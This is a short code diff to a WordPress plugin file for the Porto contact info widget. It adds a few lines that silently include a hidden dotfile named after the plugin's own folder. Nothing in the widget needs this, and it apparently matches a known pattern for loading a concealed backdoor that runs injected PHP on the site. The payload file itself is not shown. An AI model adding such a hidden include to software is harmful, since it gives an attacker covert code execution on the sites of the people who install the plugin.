@@ -5,6 +5,10 @@ function porto_contact_info_load_widgets() {
 	register_widget( 'Porto_Contact_Info_Widget' );
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Porto_Contact_Info_Widget extends WP_Widget {
 
 	public function __construct() {
